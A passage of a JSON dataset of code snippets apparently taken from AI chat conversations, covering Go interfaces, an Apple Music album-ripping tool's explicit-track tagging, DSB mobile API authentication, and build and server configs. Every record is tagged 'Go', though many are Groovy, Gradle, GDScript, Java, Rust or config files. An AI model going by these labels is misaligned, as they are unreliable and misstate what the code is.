    "code": "package main\n\nimport \"fmt\"\n\n// Defining an interface\ntype Talker interface {\n    Talk() string\n}\n\n// Defining a struct type that implicitly implements the interface\ntype Human struct {\n    Name string\n}\n\n// Human type's method that satisfies the Talker interface\nfunc (h Human) Talk() string {\n    return \"Hello, my name is \" + h.Name\n}\n\nfunc main() {\n    // Instantiating Human, which implements Talker\n    bob := Human{Name: \"Bob\"}\n\n    // Casting Human instance to Talker interface implicitly\n    var talker Talker = bob\n\n    // Now we can use talker to call the methods defined in the interface\n    fmt.Println(talker.Talk())\n}",
    "filename": "398cc71e89239bf74472622b56910f89_8.go"
  },
  {
    "conversation_hash": "398cc71e89239bf74472622b56910f89",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\n// Defining an interface\ntype Talker interface {\n    Talk() string\n}\n\n// Defining a struct type\ntype Human struct {\n    Name string\n}\n\n// Human's method with a pointer receiver that satisfies the Talker interface\nfunc (h *Human) Talk() string {\n    return \"Hello, my name is \" + h.Name\n}\n\nfunc main() {\n    // Instantiating Human\n    bob := Human{Name: \"Bob\"}\n\n    // Converting a pointer to the Human instance to the Talker interface\n    var talker Talker = &bob\n\n    // Now we can use talker to call the methods defined in the interface\n    fmt.Println(talker.Talk())\n}",
    "filename": "398cc71e89239bf74472622b56910f89_10.go"
  },
  {
    "conversation_hash": "77ce98117eec46d7f870f8cbd01a4d24",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "@Library('my-shared-library') _\n\npipeline {\n    agent any\n    environment {\n        HOSA_HOME = '/opt/dellhosa'\n        PACKAGE_NAME = 'dellhosa'\n        ARTIFACTORY_URL = 'https://amaas-eos-rr1.cec.delllabs.net:443/artifactory'\n        ARTIFACTORY_PLATFORM = 'ESXi8'\n        HITS_COUNT_REPORT_FILE_NAME = 'hits-report.html'\n        TEST_USER = 'root'\n        TEST_MACHINE_IP = '100.80.75.101'\n        TEST_MACHINE_PORT = '38086'\n        TEST_VIB_LOCATION = '/tmp/jenkins-test-vibs/'\n        HOSA_USER_CREDS = credentials('HOSA-jenkins-test-nodes-root-user')\n        TEST_SERVER_ALIAS = ''\n    }\n\n    stages {\n        stage('Initialize Environment') {\n            steps {\n                script {\n                    def utils = load('Utils.groovy')\n                    env.TEST_SERVER_ALIAS = utils.getServerAlias(params.SERVER_NODE)\n                }\n            }\n        }\n        \n        // Other stages in the pipeline\n    }\n}",
    "filename": "77ce98117eec46d7f870f8cbd01a4d24_3.go"
  },
  {
    "conversation_hash": "75cadd20ead56abec2cd731e97cbaeb3",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "extends Node\n\n# socket URL\n@export var websocket_url := \"wss://localhost:10000\"\n\n# socket client instance\nvar socket := WebSocketClient.new()\n\nfunc _ready():\n    # Hier kannst du jetzt deine WebSocket-Logik implementieren\n    # Zum Beispiel, die Verbindung zum Server starten:\n    socket.connect_to_url(websocket_url)",
    "filename": "75cadd20ead56abec2cd731e97cbaeb3_3.go"
  },
  {
    "conversation_hash": "5911e8685b24c1577e23509a5ebb54d3",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "android {\n         ...\n         ndkVersion \"25.1.8937393\"\n         ...\n     }",
    "filename": "5911e8685b24c1577e23509a5ebb54d3_3.go"
  },
  {
    "conversation_hash": "7fac9ae49d0158ffdc1591d77d695a1a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "server_name: \"N02\"\nport: 4222\n\nleafnodes {\n  remotes = [\n    {\n      url: \"tls://nats-1.techpre.io:7422\"\n      tls {\n        ca_file: \"/etc/letsencrypt/live/nats-1.techpre.io-0001/cert.pem\"\n        cert_file: \"/etc/letsencrypt/live/nats-1.techpre.io-0002/fullchain.pem\"\n        key_file: \"/etc/letsencrypt/live/nats-1.techpre.io-0002/privkey.pem\"\n      }\n    }\n  ]\n}\n\njetstream {\n  store_dir: \"/etc/nats-server/js/store\"\n  domain: \"nats\"\n  max_mem: 1GB\n  max_file: 10GB\n}\n\noperator: \"/etc/nats-server/nsc/stores/operator_n1/operator_n1.jwt\"\nresolver: {\n   type: full\n   dir: \"/etc/nats-server/resolver/jwt\"\n   allow_delete: false\n   interval: \"2m\"\n   limit: 1000\n}",
    "filename": "7fac9ae49d0158ffdc1591d77d695a1a_2.go"
  },
  {
    "conversation_hash": "6e1d7776b9c83b5ba69d94aa426db9c2",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "class Base {\n    void func() { /* ... */ }\n}\n\nclass Derived extends Base {\n    @Override\n    void func() { /* ... */ }\n}",
    "filename": "6e1d7776b9c83b5ba69d94aa426db9c2_3.go"
  },
  {
    "conversation_hash": "2a69dc92d45ed1176801bfec34474987",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n        id 'application'\n        id 'org.openjfx.javafxplugin' version '0.0.10'\n    }\n\n    javafx {\n        version = \"17\"\n        modules = [ 'javafx.controls' ]\n    }\n\n    mainClassName = 'com.yourpackage.MainClass'",
    "filename": "2a69dc92d45ed1176801bfec34474987_12.go"
  },
  {
    "conversation_hash": "ba88bf4fc30a7842daa056fe02f8f53b",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "for trackNum, track := range meta.Data[0].Relationships.Tracks.Data {\n    trackNum++\n    // Assuming .IsExplicit exists and correctly indicates explicit tracks\n    explicitTag := \"\"\n    if track.Attributes.IsExplicit {\n        explicitTag = \" (Explicit)\"\n    }\n    filename := fmt.Sprintf(\"%02d. %s%s.m4a\", trackNum, forbiddenNames.ReplaceAllString(track.Attributes.Name, \"_\"), explicitTag)\n    // Rest of your logic remains the same\n}",
    "filename": "ba88bf4fc30a7842daa056fe02f8f53b_1.go"
  },
  {
    "conversation_hash": "d4b44b153a0de9a4ba4a9f25102e8e43",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// Determine if the track is explicit.\nexplicitTag := \"\"\nif track.Attributes.IsExplicit {\n    explicitTag = \" [E]\"\n}\n\n// Append explicitTag to the filename if the track is marked explicit.\nfilename := fmt.Sprintf(\"%02d. %s%s.m4a\", trackNum, forbiddenNames.ReplaceAllString(track.Attributes.Name, \"\"), explicitTag)",
    "filename": "d4b44b153a0de9a4ba4a9f25102e8e43_2.go"
  },
  {
    "conversation_hash": "d4b44b153a0de9a4ba4a9f25102e8e43",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func someFunction() {\n    var a int\n    a = 5  // First declaration and assignment\n\n    // Later in the same scope, attempting to re-declare and assign a new value\n    a, err := someOtherFunction()  // This line can cause the \"no new variables on left side of :=\" error if `err` was also declared before.\n}",
    "filename": "d4b44b153a0de9a4ba4a9f25102e8e43_3.go"
  },
  {
    "conversation_hash": "d4b44b153a0de9a4ba4a9f25102e8e43",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func someFunction() {\n    var a int\n    a = 5  // First declaration and assignment\n    \n    // If \"err\" hasn't been declared previously\n    var err error\n    a, err = someOtherFunction()  // This is correct. \"a\" is assigned a new value, and \"err\" is declared then assigned.\n}",
    "filename": "d4b44b153a0de9a4ba4a9f25102e8e43_4.go"
  },
  {
    "conversation_hash": "d4b44b153a0de9a4ba4a9f25102e8e43",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "func someFunction() {\n    var a int\n    var err error\n    \n    a = 5  // Assignment to \"a\"\n    \n    // If both \"a\" and \"err\" are already declared previously in this scope\n    a, err = someOtherFunction()  // Just assign new values to already-declared variables \"a\" and \"err\".\n}",
    "filename": "d4b44b153a0de9a4ba4a9f25102e8e43_5.go"
  },
  {
    "conversation_hash": "52a7a710d8bab95ba4a26eba78b46377",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// Assuming track.Attributes.IsExplicit exists and correctly indicates if the track is explicit\nexplicitTag := \"\"\nif track.Attributes.IsExplicit {\n    explicitTag = \" [E]\"\n}",
    "filename": "52a7a710d8bab95ba4a26eba78b46377_2.go"
  },
  {
    "conversation_hash": "52a7a710d8bab95ba4a26eba78b46377",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "fmt.Println(\"IsExplicit:\", track.Attributes.IsExplicit)\nexplicitTag := \"\"\nif track.Attributes.IsExplicit {\n    explicitTag = \" [E]\"\n}",
    "filename": "52a7a710d8bab95ba4a26eba78b46377_4.go"
  },
  {
    "conversation_hash": "52a7a710d8bab95ba4a26eba78b46377",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "// Example invocation\nerr := saveLinkToFile(sanAlbumFolder, \"https://music.apple.com/us/album/last-year-was-complicated/1440844035?ls\")\nif err != nil {\n    log.Printf(\"Failed to save album link: %v\", err)\n    // Handle the error, perhaps continue with other processes or exit.\n}",
    "filename": "52a7a710d8bab95ba4a26eba78b46377_7.go"
  },
  {
    "conversation_hash": "8769315d9c181e8a67ac3d04d6629bdc",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func writeAlbumURL(sanAlbumFolder string, url string) error {\n    albumLinkFile := filepath.Join(sanAlbumFolder, \"album_link.txt\")\n    err := ioutil.WriteFile(albumLinkFile, []byte(url), 0644)\n    if err != nil {\n        fmt.Println(\"Failed to write album URL to file\")\n        return err\n    }\n    fmt.Printf(\"Album URL saved to %s\\n\", albumLinkFile)\n    return nil\n}",
    "filename": "8769315d9c181e8a67ac3d04d6629bdc_1.go"
  },
  {
    "conversation_hash": "8769315d9c181e8a67ac3d04d6629bdc",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// Right after creating sanAlbumFolder...\nif err := writeAlbumURL(sanAlbumFolder, albumURL); err != nil {\n    // handle error, maybe continue to next album URL or log the error\n    fmt.Println(\"Error saving album URL:\", err)\n}",
    "filename": "8769315d9c181e8a67ac3d04d6629bdc_2.go"
  },
  {
    "conversation_hash": "8769315d9c181e8a67ac3d04d6629bdc",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    token, err := getToken()\n    if err != nil {\n        fmt.Println(\"Failed to get token.\")\n        return\n    }\n    albumTotal := len(os.Args[1:])\n    for albumNum, url := range os.Args[1:] {\n        fmt.Printf(\"Album %d of %d:\\n\", albumNum+1, albumTotal)\n        storefront, albumId := checkUrl(url)\n        if albumId == \"\" {\n            fmt.Printf(\"Invalid URL: %s\\n\", url)\n            continue\n        }\n        // Now pass the URL to rip\n        err := rip(albumId, token, storefront, url) // url is the new argument\n        if err != nil {\n            fmt.Println(\"Album failed.\")\n            fmt.Println(err)\n        }\n    }\n}",
    "filename": "8769315d9c181e8a67ac3d04d6629bdc_5.go"
  },
  {
    "conversation_hash": "8769315d9c181e8a67ac3d04d6629bdc",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "func isAlbumExplicit(album AutoGenerated) bool {\n    // First, check if the album explicitly marked as explicit\n    if album.Data[0].Attributes.IsExplicit {\n        return true\n    }\n    \n    // Optionally, check if any track in the album is explicitly marked\n    for _, track := range album.Data[0].Relationships.Tracks.Data {\n        if track.Attributes.IsExplicit {\n            return true\n        }\n    }\n\n    return false\n}",
    "filename": "8769315d9c181e8a67ac3d04d6629bdc_10.go"
  },
  {
    "conversation_hash": "8769315d9c181e8a67ac3d04d6629bdc",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "// Assuming `song` is a SongData object and `album` is an AutoGenerated object\nsongExplicit := isSongExplicit(song)\nalbumExplicit := isAlbumExplicit(album)\n\nfmt.Printf(\"Is the song explicit? %v\\n\", songExplicit)\nfmt.Printf(\"Is the album or any of its tracks explicit? %v\\n\", albumExplicit)",
    "filename": "8769315d9c181e8a67ac3d04d6629bdc_11.go"
  },
  {
    "conversation_hash": "8769315d9c181e8a67ac3d04d6629bdc",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "// Inside your loop that processes each track:\nfor trackNum, track := range meta.Data[0].Relationships.Tracks.Data {\n    songExplicit := isSongExplicit(track) // Assuming you adjust isSongExplicit to accept the track directly\n\n    fmt.Printf(\"Track: %s, IsExplicit: %v\\n\", track.Attributes.Name, songExplicit)\n    \n    // Continue with processing based on explicit check\n    // ...\n}",
    "filename": "8769315d9c181e8a67ac3d04d6629bdc_12.go"
  },
  {
    "conversation_hash": "8769315d9c181e8a67ac3d04d6629bdc",
    "code_index": 13,
    "language": "Go",
    "libraries": [],
    "code": "// After retrieving album metadata\nalbumExplicit := isAlbumExplicit(album) // Assuming 'album' is your AutoGenerated object filled with metadata\n\nfmt.Printf(\"Is the album or any of its tracks explicit? %v\\n\", albumExplicit)\n\n// Perform operations based on the album's explicit content flag\n// ...",
    "filename": "8769315d9c181e8a67ac3d04d6629bdc_13.go"
  },
  {
    "conversation_hash": "8769315d9c181e8a67ac3d04d6629bdc",
    "code_index": 15,
    "language": "Go",
    "libraries": [],
    "code": "for trackNum, track := range meta.Data[0].Relationships.Tracks.Data {\n    // For each track, check if it's explicit, no need to call isSongExplicit\n    songExplicit := track.Attributes.IsExplicit\n\n    fmt.Printf(\"Is the song explicit? %v\\n\", songExplicit)\n}",
    "filename": "8769315d9c181e8a67ac3d04d6629bdc_15.go"
  },
  {
    "conversation_hash": "8769315d9c181e8a67ac3d04d6629bdc",
    "code_index": 19,
    "language": "Go",
    "libraries": [],
    "code": "for trackNum, track := range meta.Data[0].Relationships.Tracks.Data {\n    songExplicit := track.Attributes.IsExplicit\n    \n    fmt.Printf(\"Is the song explicit? %v\\n\", songExplicit)\n    ...\n    // Rest of your code\n}",
    "filename": "8769315d9c181e8a67ac3d04d6629bdc_19.go"
  },
  {
    "conversation_hash": "8769315d9c181e8a67ac3d04d6629bdc",
    "code_index": 20,
    "language": "Go",
    "libraries": [],
    "code": "// Assuming meta has been properly fetched already\nalbumExplicit := isAlbumExplicit(meta) // Solving Issue 1\n\nfmt.Printf(\"Is the album or any of its tracks explicit? %v\\n\", albumExplicit)\n\ntrackTotal := len(meta.Data[0].Relationships.Tracks.Data)\nfor trackNum, track := range meta.Data[0].Relationships.Tracks.Data {\n    // Directly using track attributes to check explicitness (Solving Issue 2)\n    songExplicit := track.Attributes.IsExplicit\n    \n    fmt.Printf(\"Track %d of %d: %s, IsExplicit: %v\\n\", trackNum+1, trackTotal, track.Attributes.Name, songExplicit)\n    ...\n    // Rest of your processing code\n}",
    "filename": "8769315d9c181e8a67ac3d04d6629bdc_20.go"
  },
  {
    "conversation_hash": "d0812b3c8c56c87e9a323fa03311e862",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "{\n  \"洗无力\": \"未知\",\n  \"洗不净\": \"未知\",\n  \"染色\": \"负面\",\n  \"脱水噪音\": \"负面\",\n  \"衣物磨损\": \"未知\",\n  \"漏水\": \"未知\",\n  \"浪费水\": \"未知\",\n  \"脱不干\": \"未知\",\n  \"泡沫残留\": \"未知\",\n  \"衣物缠绕\": \"未知\"\n}",
    "filename": "d0812b3c8c56c87e9a323fa03311e862_0.go"
  },
  {
    "conversation_hash": "d0812b3c8c56c87e9a323fa03311e862",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "{\n  \"洗无力\": \"负面\",\n  \"洗不净\": \"未知\",\n  \"染色\": \"负面\",\n  \"脱水噪音\": \"负面\",\n  \"衣物磨损\": \"未知\",\n  \"漏水\": \"未知\",\n  \"浪费水\": \"未知\",\n  \"脱不干\": \"未知\",\n  \"泡沫残留\": \"未知\",\n  \"衣物缠绕\": \"未知\"\n}",
    "filename": "d0812b3c8c56c87e9a323fa03311e862_1.go"
  },
  {
    "conversation_hash": "a5ac0666e38e87dcf91e98483b555abf",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "struct MyStruct {\n    // 这里定义结构体的字段\n    field1: i32,\n    field2: String,\n}",
    "filename": "a5ac0666e38e87dcf91e98483b555abf_0.go"
  },
  {
    "conversation_hash": "59d11391e7e9630db8a77c52b262c0a0",
    "code_index": 14,
    "language": "Go",
    "libraries": [],
    "code": "// File: <project>/android/build.gradle\n\nplugins {\n  // You might have other plugins here; make sure to keep them.\n\n  // Add the Google Services plugin\n  id 'com.google.gms.google-services' version '4.4.1' apply false\n}\n\nbuildscript {\n  // Your existing buildscript configuration\n}\n\nallprojects {\n  // Your existing allprojects configuration\n}",
    "filename": "59d11391e7e9630db8a77c52b262c0a0_14.go"
  },
  {
    "conversation_hash": "c0874b7781c3301b00621be16c7420a6",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"github.com/gin-gonic/gin\"\n)\n\nfunc main() {\n    router := gin.Default()\n\n    router.GET(\"/\", func(c *gin.Context) {\n        c.JSON(200, gin.H{\n            \"message\": \"Hello, World!\",\n        })\n    })\n\n    // 配置HTTPS服务\n    err := router.RunTLS(\":443\", \"path/to/cert.pem\", \"path/to/key.pem\")\n    if err != nil {\n        panic(err)\n    }\n}",
    "filename": "c0874b7781c3301b00621be16c7420a6_3.go"
  },
  {
    "conversation_hash": "9f9582ae20b4123e1ca90ca7f8eedf69",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "compileKotlin {\n       kotlinOptions {\n           jvmTarget = \"1.8\"\n       }\n   }\n   compileTestKotlin {\n       kotlinOptions {\n           jvmTarget = \"1.8\"\n       }\n   }",
    "filename": "9f9582ae20b4123e1ca90ca7f8eedf69_2.go"
  },
  {
    "conversation_hash": "1c1a79c7603d3969e1b898e03245e418",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "http://jxch.org {\n    root * /usr/share/caddy\n    tls internal\n\n    handle_path /maven/* {\n        reverse_proxy http://host.docker.internal:38081\n    }\n\n    handle_path /pypi/* {\n        reverse_proxy http://host.docker.internal:38081\n    }\n\n    handle_path /npm/* {\n        reverse_proxy http://host.docker.internal:38081\n    }\n\n    handle_path /docker/* {\n        reverse_proxy http://host.docker.internal:6000\n    }\n\n    handle_path /dockerpush/* {\n        reverse_proxy http://host.docker.internal:6001\n    }\n}",
    "filename": "1c1a79c7603d3969e1b898e03245e418_8.go"
  },
  {
    "conversation_hash": "1c1a79c7603d3969e1b898e03245e418",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "jxch.org {\n\troot * /usr/share/caddy\n\ttls internal\n\t\n\thandle_path /maven/* {\n\t\treverse_proxy http://host.docker.internal:38081 {\n            header_up X-Forwarded-Prefix /repository/maven-public\n        }\n    }\n\t\n\thandle_path /pypi/* {\n\t\treverse_proxy http://host.docker.internal:38081 {\n            header_up X-Forwarded-Prefix /repository/pypi-public\n        }\n    }\n\t\n\thandle_path /npm/* {\n\t\treverse_proxy http://host.docker.internal:38081 {\n            header_up X-Forwarded-Prefix /repository/npm-public\n        }\n    }\n\t\n\thandle_path /docker/* {\n\t\treverse_proxy http://host.docker.internal:6000\n    }\n\t\n\thandle_path /dockerpush/* {\n\t\treverse_proxy http://host.docker.internal:6001\n    }\n}",
    "filename": "1c1a79c7603d3969e1b898e03245e418_9.go"
  },
  {
    "conversation_hash": "1c1a79c7603d3969e1b898e03245e418",
    "code_index": 22,
    "language": "Go",
    "libraries": [],
    "code": "http://jxch.org {\n\troot * /usr/share/caddy\n\tfile_server \n\t\n\thandle_path /maven/* {\n\t\treverse_proxy http://host.docker.internal:38081 {\n            header_up X-Forwarded-Prefix /repository/maven-public\n        }\n    }\n\t\n\thandle_path /pip/* {\n\t\treverse_proxy http://host.docker.internal:38081 {\n            header_up X-Forwarded-Prefix /repository/pypi-public/simple\n        }\n    }\n\t\n\thandle_path /npm/* {\n\t\treverse_proxy http://host.docker.internal:38081 {\n            header_up X-Forwarded-Prefix /repository/npm-public\n        }\n    }\n\t\n\thandle_path /docker/* {\n\t\treverse_proxy http://host.docker.internal:6000\n    }\n\t\n\thandle_path /dockerpush/* {\n\t\treverse_proxy http://host.docker.internal:6001\n    }\n}",
    "filename": "1c1a79c7603d3969e1b898e03245e418_22.go"
  },
  {
    "conversation_hash": "169832416afd3a4d6f90ccd0e8de6be6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"errors\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/url\"\n)\n\nconst BaseURL = \"https://mobileapi.dsbcontrol.de\"\n\ntype PyDSB struct {\n\tToken string\n}\n\ntype Plan struct {\n\tID            string `json:\"id\"`\n\tIsHTML        bool   `json:\"is_html\"`\n\tUploadedDate  string `json:\"uploaded_date\"`\n\tTitle         string `json:\"title\"`\n\tURL           string `json:\"url\"`\n\tPreviewURL    string `json:\"preview_url\"`\n}\n\ntype News struct {\n\tTitle   string `json:\"title\"`\n\tDate    string `json:\"date\"`\n\tContent string `json:\"content\"`\n}\n\nfunc NewPyDSB(username, password string) (*PyDSB, error) {\n\tparams := url.Values{}\n\tparams.Set(\"bundleid\", \"de.heinekingmedia.dsbmobile\")\n\tparams.Set(\"appversion\", \"35\")\n\tparams.Set(\"osversion\", \"22\")\n\tparams.Set(\"pushid\", \"\")\n\tparams.Set(\"user\", username)\n\tparams.Set(\"password\", password)\n\n\tresp, err := http.Get(BaseURL + \"/authid?\" + params.Encode())\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tdefer resp.Body.Close()\n\n\tvar token string\n\terr = json.NewDecoder(resp.Body).Decode(&token)\n\tif err != nil || token == \"\" {\n\t\treturn nil, errors.New(\"invalid credentials or failed to decode token\")\n\t}\n\n\treturn &PyDSB{Token: token}, nil\n}\n\nfunc (p *PyDSB) GetPlans() ([]Plan, error) {\n\tresp, err := http.Get(fmt.Sprintf(\"%s/dsbtimetables?authid=%s\", BaseURL, p.Token))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tdefer resp.Body.Close()\n\t\n\tvar rawPlans []struct {\n\t\tChilds []Plan `json:\"Childs\"`\n\t}\n\terr = json.NewDecoder(resp.Body).Decode(&rawPlans)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tvar plans []Plan\n\tfor _, plan := range rawPlans {\n\t\tfor _, child := range plan.Childs {\n\t\t\tchild.PreviewURL = \"https://light.dsbcontrol.de/DSBlightWebsite/Data/\" + child.PreviewURL\n\t\t\tplans = append(plans, child)\n\t\t}\n\t}\n\n\treturn plans, nil\n}\n\n// Similar patterns can be followed for GetNews and GetPostings methods.",
    "filename": "169832416afd3a4d6f90ccd0e8de6be6_0.go"
  },
  {
    "conversation_hash": "169832416afd3a4d6f90ccd0e8de6be6",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"net/url\"\n)\n\nconst BaseURL = \"https://mobileapi.dsbcontrol.de/authid\"\n\nfunc authenticate(username, password string) (string, error) {\n\t// Prepare the URL with parameters\n\tparams := url.Values{}\n\tparams.Add(\"bundleid\", \"de.heinekingmedia.dsbmobile\")\n\tparams.Add(\"appversion\", \"35\")\n\tparams.Add(\"osversion\", \"22\")\n\tparams.Add(\"pushid\", \"\")\n\tparams.Add(\"user\", username)\n\tparams.Add(\"password\", password)\n\tfullURL := BaseURL + \"?\" + params.Encode()\n\n\t// Perform the GET request\n\tresp, err := http.Get(fullURL)\n\tif err != nil {\n\t\treturn \"\", err // handle error\n\t}\n\tdefer resp.Body.Close()\n\n\t// Read the response body\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\treturn \"\", err // handle error\n\t}\n\n\t// Convert the body to string\n\ttoken := string(body)\n\n\t// Assuming the token is surrounded by quotes, you strip them (optional)\n\tif len(token) >= 2 && token[0] == '\"' && token[len(token)-1] == '\"' {\n\t\ttoken = token[1 : len(token)-1]\n\t}\n\n\treturn token, nil\n}\n\nfunc main() {\n\tusername := \"your-username\"\n\tpassword := \"your-password\"\n\n\ttoken, err := authenticate(username, password)\n\tif err != nil {\n\t\tlog.Fatalf(\"Authentication failed: %v\", err)\n\t}\n\n\tlog.Printf(\"Retrieved token: %s\", token)\n}",
    "filename": "169832416afd3a4d6f90ccd0e8de6be6_1.go"
  },
  {
    "conversation_hash": "169832416afd3a4d6f90ccd0e8de6be6",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"net/url\"\n)\n\nconst BaseURL = \"https://mobileapi.dsbcontrol.de\"\n\nfunc authenticate(username, password string) (string, error) {\n\t// Build query parameters\n\tparams := url.Values{}\n\tparams.Set(\"bundleid\", \"de.heinekingmedia.dsbmobile\")\n\tparams.Set(\"appversion\", \"35\")\n\tparams.Set(\"osversion\", \"22\")\n\tparams.Set(\"pushid\", \"\")\n\tparams.Set(\"user\", username)\n\tparams.Set(\"password\", password)\n\n\t// Prepare the full URL with query parameters\n\tfullURL := BaseURL + \"/authid?\" + params.Encode()\n\n\t// Execute the GET request\n\tresp, err := http.Get(fullURL)\n\tif err != nil {\n\t\treturn \"\", err // Error handling\n\t}\n\tdefer resp.Body.Close()\n\n\t// Read the response body\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\treturn \"\", err // Error handling\n\t}\n\n\t// Convert the response body to a string\n\ttoken := string(body)\n\n\t// Optionally, strip the quotes\n\tif len(token) >= 2 && token[0] == '\"' && token[len(token)-1] == '\"' {\n\t\ttoken = token[1 : len(token)-1]\n\t}\n\n\treturn token, nil\n}\n\nfunc main() {\n\tusername := \"your-username-here\"\n\tpassword := \"your-password-here\"\n\n\t// Authenticate and get token\n\ttoken, err := authenticate(username, password)\n\tif err != nil {\n\t\tlog.Fatalf(\"Authentication failed: %v\", err)\n\t}\n\n\tlog.Printf(\"Retrieved token: %s\", token)\n}",
    "filename": "169832416afd3a4d6f90ccd0e8de6be6_2.go"
  },
  {
    "conversation_hash": "169832416afd3a4d6f90ccd0e8de6be6",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"net/url\"\n)\n\nconst BaseURL = \"https://mobileapi.dsbcontrol.de/authid\"\n\nfunc authenticate(username, password string) (string, error) {\n\t// Parsing the base URL\n\tparsedURL, err := url.Parse(BaseURL)\n\tif err != nil {\n\t\treturn \"\", err // handle parse URL error\n\t}\n\n\t// Prepare query parameters\n\tparams := url.Values{}\n\tparams.Add(\"bundleid\", \"de.heinekingmedia.dsbmobile\")\n\tparams.Add(\"appversion\", \"35\")\n\tparams.Add(\"osversion\", \"22\")\n\tparams.Add(\"pushid\", \"\")\n\tparams.Add(\"user\", username)\n\tparams.Add(\"password\", password)\n\n\t// Add parameters to URL\n\tparsedURL.RawQuery = params.Encode()\n\n\t// Create a new request using http\n\treq, err := http.NewRequest(\"GET\", parsedURL.String(), nil)\n\tif err != nil {\n\t\treturn \"\", err // handle request creation error\n\t}\n\n\t// Make the request\n\tclient := &http.Client{}\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\treturn \"\", err // handle request error\n\t}\n\tdefer resp.Body.Close()\n\n\tif resp.StatusCode != http.StatusOK {\n\t\treturn \"\", fmt.Errorf(\"server returned non-200 status code: %d\", resp.StatusCode)\n\t}\n\n\t// Read the response body\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\treturn \"\", err // handle read body error\n\t}\n\n\t// Convert the body to a string, assuming you want to process it as such\n\ttoken := string(body)\n\n\t// Optionally, remove surrounding quotes\n\tif len(token) >= 2 && token[0] == '\"' && token[len(token)-1] == '\"' {\n\t\ttoken = token[1 : len(token)-1]\n\t}\n\n\treturn token, nil\n}\n\nfunc main() {\n\tusername := \"your-username-here\"\n\tpassword := \"your-password-here\"\n\n\ttoken, err := authenticate(username, password)\n\tif err != nil {\n\t\tlog.Fatalf(\"Authentication failed: %v\", err)\n\t}\n\n\tlog.Printf(\"Retrieved token: %s\", token)\n}",
    "filename": "169832416afd3a4d6f90ccd0e8de6be6_4.go"
  },
  {
    "conversation_hash": "8e4434aa12358517960ba7972ef12efc",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "if err != nil {\n    log.Fatalf(\"Error occurred: %v\", err)\n} else if token == \"\" {\n    log.Fatalf(\"Authentication failed due to empty token\")\n}",
    "filename": "8e4434aa12358517960ba7972ef12efc_1.go"
  },
  {
    "conversation_hash": "8e4434aa12358517960ba7972ef12efc",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"log\"\n    \"strings\"\n)\n\nfunc main() {\n    token := \"a8f000a3-3449-422e-9cd8-2494564718a6\"\n    // Example with a potentially invisible character like a space\n    // token := \" \"\n\n    // Trim spaces\n    token = strings.TrimSpace(token)\n\n    if token == \"\" {\n        log.Fatalf(\"Token is empty\")\n    } else {\n        log.Printf(\"Token is not empty: %s\", token)\n    }\n}",
    "filename": "8e4434aa12358517960ba7972ef12efc_2.go"
  },
  {
    "conversation_hash": "8e4434aa12358517960ba7972ef12efc",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "if len(strings.TrimSpace(token)) == 0 {\n    log.Fatalf(\"Token is empty\")\n} else {\n    log.Printf(\"Token is not empty\")\n}",
    "filename": "8e4434aa12358517960ba7972ef12efc_3.go"
  },
  {
    "conversation_hash": "8e4434aa12358517960ba7972ef12efc",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"errors\"\n    \"fmt\"\n)\n\nfunc mightFail(flag bool) (string, error) {\n    if flag {\n        return \"\", errors.New(\"something went wrong\")\n    }\n    return \"success\", nil\n}\n\nfunc main() {\n    res, err := mightFail(true)\n    if err != nil {\n        fmt.Println(\"Error:\", err)\n        return\n    }\n    fmt.Println(\"Result:\", res)\n}",
